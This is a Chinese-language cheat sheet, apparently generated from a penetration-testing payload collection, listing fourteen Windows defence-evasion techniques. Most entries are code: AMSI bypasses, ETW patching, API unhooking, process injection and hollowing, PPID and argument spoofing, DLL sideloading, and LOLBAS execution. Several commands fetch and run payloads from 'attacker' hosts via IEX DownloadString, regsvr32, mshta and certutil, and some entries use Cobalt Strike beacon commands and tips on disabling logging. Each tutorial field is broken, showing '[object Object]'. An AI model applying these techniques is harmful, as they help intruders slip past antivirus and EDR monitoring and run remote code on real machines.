# 免杀与规避 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（14 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. PowerShell免杀

- **id:** `evasion-powershell`
- **分类:** 免杀与规避 / PowerShell
- **tags:** `powershell` `evasion` `obfuscation`

PowerShell脚本免杀技术

**前置条件**

- 目标机器访问权限
- Windows系统

**利用步骤**

#### 编码执行

```
powershell -enc BASE64_ENCODED_COMMAND
```

Base64编码执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `-enc` | Base64编码命令 | parameter |

> platform: `windows`

#### 远程加载

```
IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")
```

远程加载脚本

> platform: `windows`

#### 混淆变量名

```
1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"
```

变量名混淆

> platform: `windows`

#### 无文件执行

```
powershell -w hidden -nop -c "IEX (New-Object Net.WebClient).DownloadString(\"http://attacker/script.ps1\")"
```

隐藏窗口无配置文件执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `-w hidden` | 隐藏窗口 | parameter |
| `-nop` | 无配置文件 | parameter |

> platform: `windows`

**EDR 绕过**

#### 降级执行

```
powershell -version 2 -c "command"
```

使用PowerShell v2绕过日志

**OPSEC**

- PowerShell日志可能记录命令
- 考虑禁用日志
- 使用混淆技术

**教程**

[object Object]

---

### 2. AMSI绕过

- **id:** `amsi-bypass`
- **分类:** 免杀与规避 / AMSI绕过
- **tags:** `amsi` `bypass` `evasion`

绕过反恶意软件扫描接口

**前置条件**

- PowerShell环境
- AMSI启用

**利用步骤**

#### 反射绕过

```
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
```

通过反射禁用AMSI

| 片段 | 说明 | 类型 |
|---|---|---|
| `AmsiUtils` | AMSI工具类 | keyword |
| `amsiInitFailed` | 初始化失败标志 | keyword |
| `SetValue($true)` | 设置为失败 | value |

> platform: `windows`

#### 内存修补

```
$a=[Ref].Assembly.GetTypes();ForEach($x in $a){if($x.Name -like "*iUtils"){$z=$x}};$y=$z.GetFields("NonPublic,Static");ForEach($x in $y){if($x.Name -like "*itFailed"){$x.SetValue($null,$true)}}
```

混淆版本绕过

> platform: `windows`

#### DLL劫持

```
替换或劫持amsi.dll
```

通过DLL劫持绕过

> platform: `windows`

#### 使用工具

```
Import-Module .\AmsiBypass.ps1
Invoke-AmsiBypass
```

使用现成工具

> platform: `windows`

**教程**

[object Object]

---

### 3. ETW Patch绕过

- **id:** `etw-patch`
- **分类:** 免杀与规避 / ETW
- **tags:** `etw` `bypass` `evasion`

禁用ETW监控

**前置条件**

- 代码执行权限

**利用步骤**

#### PowerShell禁用ETW

```
[System.Diagnostics.Eventing.EventProvider]::SetEnabled([System.Guid]::NewGuid(), 0, 0)
或
[Reflection.Assembly]::LoadWithPartialName("System.Diagnostics.Tracing") | Out-Null
$etw = [System.Diagnostics.Tracing.EventProvider]::new([Guid]::NewGuid())
$etw.SetEnabled(0)
```

PowerShell禁用ETW

> platform: `windows`

#### C#禁用ETW

```
Assembly.Load("System.Diagnostics.Tracing")
Type etwType = typeof(EventProvider)
MethodInfo setEnabled = etwType.GetMethod("SetEnabled", BindingFlags.NonPublic | BindingFlags.Static)
setEnabled.Invoke(null, new object[] { Guid.NewGuid(), 0, 0 })
```

C#禁用ETW

> platform: `windows`

#### 修补ntdll

```
$ntdll = [Win32.Kernel32]::LoadLibrary("ntdll.dll")
$etwEventWrite = [Win32.Kernel32]::GetProcAddress($ntdll, "EtwEventWrite")
[Win32.Kernel32]::VirtualProtect($etwEventWrite, [uint32]1, 0x40, [ref]$oldProtect)
[Win32.Kernel32]::WriteProcessMemory(-1, $etwEventWrite, [byte[]](0xC3), 1, [ref]$bytesWritten)
```

修补EtwEventWrite

| 片段 | 说明 | 类型 |
|---|---|---|
| `EtwEventWrite` | ETW写入函数 | keyword |
| `0xC3` | RET指令 | keyword |

> platform: `windows`

**教程**

[object Object]

---

### 4. API Unhooking

- **id:** `api-unhooking`
- **分类:** 免杀与规避 / Unhooking
- **tags:** `unhooking` `hook` `evasion`

移除EDR的API Hook

**前置条件**

- 代码执行权限

**利用步骤**

#### 从磁盘还原

```
$ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
$proc = [System.Diagnostics.Process]::GetCurrentProcess()
$base = $proc.MainModule.BaseAddress
# 找到.text段并覆盖
```

从磁盘读取干净DLL

> platform: `windows`

#### 从KnownDlls还原

```
$section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\KnownDlls\ntdll.dll")
$map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)
# 复制干净的代码段
```

从KnownDlls还原

> platform: `windows`

#### Hell's Gate

```
通过系统调用号直接调用:
1. 解析NTDLL获取系统调用号
2. 直接执行syscall
3. 绕过用户模式Hook
```

Hell's Gate技术

> platform: `windows`

**教程**

[object Object]

---

### 5. 进程注入

- **id:** `process-injection`
- **分类:** 免杀与规避 / 进程注入
- **tags:** `injection` `process` `evasion`

将代码注入到其他进程

**前置条件**

- 代码执行权限

**利用步骤**

#### 经典DLL注入

```
$proc = Get-Process -Name notepad
$handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
$addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x40)
[Win32.Kernel32]::WriteProcessMemory($handle, $addr, $dllPath, $dllPath.Length, [ref]0)
[Win32.Kernel32]::CreateRemoteThread($handle, 0, 0, $loadLibraryAddr, $addr, 0, [ref]0)
```

DLL注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `VirtualAllocEx` | 在目标进程分配内存 | keyword |
| `WriteProcessMemory` | 写入DLL路径 | keyword |
| `CreateRemoteThread` | 创建远程线程 | keyword |

> platform: `windows`

#### Process Hollowing

```
1. CreateProcess(CREATE_SUSPENDED)
2. NtUnmapViewOfSection
3. VirtualAllocEx
4. WriteProcessMemory
5. ResumeThread
```

进程镂空

> platform: `windows`

#### APC注入

```
$threadId = $proc.Threads[0].Id
$queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
[Win32.Kernel32]::QueueUserAPC($queueAPC, $handle, $addr)
```

APC队列注入

> platform: `windows`

**教程**

[object Object]

---

### 6. AppLocker绕过

- **id:** `applocker-bypass`
- **分类:** 免杀与规避 / AppLocker
- **tags:** `applocker` `bypass` `evasion`

绕过AppLocker应用程序限制

**前置条件**

- AppLocker限制环境

**利用步骤**

#### 使用白名单路径

```
C:\Windows\System32\spoolsv.exe
C:\Windows\System32\svchost.exe
C:\Program Files\Internet Explorer\ieexec.exe
```

使用白名单可执行文件

> platform: `windows`

#### LOLBAS利用

```
regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
mshta.exe http://attacker.com/shell.hta
certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe
```

LOLBAS技术

> platform: `windows`

#### InstallUtil

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
```

InstallUtil绕过

> platform: `windows`

#### MSBuild

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj
```

MSBuild执行代码

> platform: `windows`

**教程**

[object Object]

---

### 7. BlockDLLs技术

- **id:** `evasion-blockdlls`
- **分类:** 免杀与规避 / BlockDLLs
- **tags:** `evasion` `blockdlls` `edr`

阻止非微软DLL加载

**前置条件**

- Windows系统
- Cobalt Strike或其他工具

**利用步骤**

#### Cobalt Strike BlockDLLs

```
beacon> blockdlls start
阻止非微软签名的DLL加载
beacon> blockdlls stop
恢复DLL加载
```

启用BlockDLLs

| 片段 | 说明 | 类型 |
|---|---|---|
| `blockdlls start` | 启用DLL过滤 | keyword |
| `非微软签名` | 只允许微软签名DLL | keyword |

> platform: `windows`

#### 进程创建时启用

```
使用CREATE_SUSPENDED标志创建进程
设置ProcessSignaturePolicy
阻止EDR DLL注入
```

进程创建时启用

> platform: `windows`

#### C#实现

```
[DllImport("kernel32.dll")]
static extern bool SetProcessMitigationPolicy(...);
ProcessSignaturePolicy policy = new ProcessSignaturePolicy();
policy.SignatureLevel = 0x0F;
SetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);
```

C#实现BlockDLLs

> platform: `windows`

**教程**

[object Object]

---

### 8. Shellcode加密

- **id:** `evasion-shellcode-encrypt`
- **分类:** 免杀与规避 / Shellcode加密
- **tags:** `evasion` `shellcode` `encrypt`

加密Shellcode绕过静态检测

**前置条件**

- Shellcode
- 加密工具

**利用步骤**

#### AES加密Shellcode

```
使用工具加密:
python shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey
生成加密的Shellcode和解密代码
```

AES加密

#### XOR加密

```
简单XOR加密:
for i in range(len(shellcode)):
    encoded[i] = shellcode[i] ^ key[i % len(key)]
运行时解密执行
```

XOR加密

| 片段 | 说明 | 类型 |
|---|---|---|
| `XOR` | 异或加密简单有效 | keyword |
| `运行时解密` | 内存中解密执行 | keyword |

#### RC4加密

```
使用RC4加密Shellcode:
from Crypto.Cipher import ARC4
cipher = ARC4.new(key)
encrypted = cipher.encrypt(shellcode)
运行时使用相同密钥解密
```

RC4加密

#### 多态加密

```
每次生成不同的解密代码:
- 随机密钥
- 随机解密顺序
- 添加垃圾指令
- 控制流混淆
```

多态加密

**教程**

[object Object]

---

### 9. 进程伪装

- **id:** `evasion-process-masq`
- **分类:** 免杀与规避 / 进程伪装
- **tags:** `evasion` `process` `masquerade`

伪装进程名称和路径

**前置条件**

- Windows系统

**利用步骤**

#### PPID欺骗

```
Cobalt Strike:
beacon> ppid 1234
设置父进程ID为合法进程
beacon> run [command]
新进程继承合法父进程
```

PPID欺骗

| 片段 | 说明 | 类型 |
|---|---|---|
| `ppid` | 设置父进程ID | keyword |
| `继承关系` | 伪装进程继承链 | keyword |

> platform: `windows`

#### 进程参数欺骗

```
CreateProcess参数:
- lpApplicationName: 合法程序路径
- lpCommandLine: 包含恶意命令
- 显示为合法进程
```

参数欺骗

> platform: `windows`

#### 进程镂空

```
1. 创建合法进程(挂起状态)
2. 写入恶意代码
3. 恢复线程执行
进程名显示为合法程序
```

进程镂空

> platform: `windows`

**教程**

[object Object]

---

### 10. PPID欺骗

- **id:** `evasion-ppid-spoof`
- **分类:** 免杀与规避 / PPID欺骗
- **tags:** `evasion` `ppid` `spoofing`

伪造父进程ID

**前置条件**

- Windows系统
- 父进程句柄

**利用步骤**

#### PowerShell实现

```
$parent = Get-Process -Name explorer
$pi = New-Object System.Diagnostics.ProcessStartInfo
$pi.FileName = "cmd.exe"
$pi.ParentProcessId = $parent.Id
[System.Diagnostics.Process]::Start($pi)
```

PowerShell PPID欺骗

> platform: `windows`

#### C#实现

```
[StructLayout(LayoutKind.Sequential)]
public struct STARTUPINFOEX {
    public STARTUPINFO StartupInfo;
    public IntPtr lpAttributeList;
}
使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS属性
```

C#实现

| 片段 | 说明 | 类型 |
|---|---|---|
| `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` | 设置父进程属性 | keyword |
| `lpAttributeList` | 属性列表 | keyword |

> platform: `windows`

#### Cobalt Strike

```
beacon> ppid [explorer_pid]
beacon> run notepad.exe
新进程父进程为explorer.exe
```

Cobalt Strike实现

> platform: `windows`

**教程**

[object Object]

---

### 11. DLL侧加载

- **id:** `evasion-dll-sideloading`
- **分类:** 免杀与规避 / DLL侧加载
- **tags:** `evasion` `dll` `sideloading`

利用DLL搜索顺序加载恶意DLL

**前置条件**

- Windows系统
- 可执行文件

**利用步骤**

#### DLL劫持

```
1. 找到可执行文件加载的DLL
2. 将恶意DLL放在搜索路径优先位置
3. 执行程序时加载恶意DLL
```

DLL劫持原理

> platform: `windows`

#### DLL转发

```
#pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")
导出原始DLL的函数
同时执行恶意代码
```

DLL转发

| 片段 | 说明 | 类型 |
|---|---|---|
| `/export:` | 导出函数 | parameter |
| `original.dll` | 转发到原始DLL | path |

> platform: `windows`

#### 常见目标

```
常见DLL劫持目标:
- version.dll
- dwmapi.dll
- uxtheme.dll
- cryptsp.dll
- winmm.dll
```

常见目标DLL

> platform: `windows`

**教程**

[object Object]

---

### 12. 参数欺骗

- **id:** `evasion-arg-spoofing`
- **分类:** 免杀与规避 / 参数欺骗
- **tags:** `evasion` `argument` `spoofing`

欺骗进程参数显示

**前置条件**

- Windows系统

**利用步骤**

#### 命令行欺骗

```
CreateProcess参数:
lpApplicationName = "C:\Windows\System32\cmd.exe"
lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"
实际执行恶意命令
```

命令行欺骗

> platform: `windows`

#### 环境变量欺骗

```
使用环境变量隐藏参数:
set EVIL=malicious_command
cmd /c %EVIL%
进程列表不显示实际命令
```

环境变量欺骗

> platform: `windows`

#### PEB修改

```
修改PEB中的命令行:
1. 创建进程
2. 修改PEB中的CommandLine缓冲区
3. 进程管理器显示假参数
```

PEB修改

| 片段 | 说明 | 类型 |
|---|---|---|
| `PEB` | 进程环境块 | keyword |
| `CommandLine` | 命令行参数存储位置 | keyword |

> platform: `windows`

**教程**

[object Object]

---

### 13. 签名二进制利用

- **id:** `evasion-signed-binary`
- **分类:** 免杀与规避 / 签名二进制
- **tags:** `evasion` `signed` `lolbin`

利用微软签名二进制执行代码

**前置条件**

- Windows系统

**利用步骤**

#### MSBuild

```
msbuild.exe malicious.csproj
执行嵌入的C#代码
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
```

MSBuild执行

> platform: `windows`

#### InstallUtil

```
InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
执行.NET程序集
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
```

InstallUtil执行

| 片段 | 说明 | 类型 |
|---|---|---|
| `/U` | 卸载模式执行代码 | parameter |
| `malicious.dll` | 恶意.NET程序集 | path |

> platform: `windows`

#### Regsvcs/Regasm

```
regsvcs.exe malicious.dll
regasm.exe malicious.dll
执行.NET程序集
```

Regsvcs/Regasm

> platform: `windows`

#### Rundll32

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
```

Rundll32执行

> platform: `windows`

**教程**

[object Object]

---

### 14. CLR注入

- **id:** `evasion-clr-injection`
- **分类:** 免杀与规避 / CLR注入
- **tags:** `evasion` `clr` `injection`

CLR内存注入技术

**前置条件**

- Windows系统
- .NET环境

**利用步骤**

#### CLR内存加载

```
使用CLR接口加载.NET程序集:
1. 获取CLR运行时
2. 创建AppDomain
3. 加载程序集
4. 执行入口点
```

CLR加载原理

> platform: `windows`

#### C#实现

```
var clr = new ClrModule();
clr.LoadAssembly(File.ReadAllBytes("malicious.exe"));
clr.Execute("Main");
从内存执行.NET程序
```

C# CLR加载

| 片段 | 说明 | 类型 |
|---|---|---|
| `LoadAssembly` | 从字节数组加载 | keyword |
| `Execute` | 执行入口点 | keyword |

> platform: `windows`

#### Cobalt Strike

```
beacon> execute-assembly /path/to/tool.exe args
从内存执行.NET程序集
不落地执行
```

Cobalt Strike实现

> platform: `windows`

**教程**

[object Object]
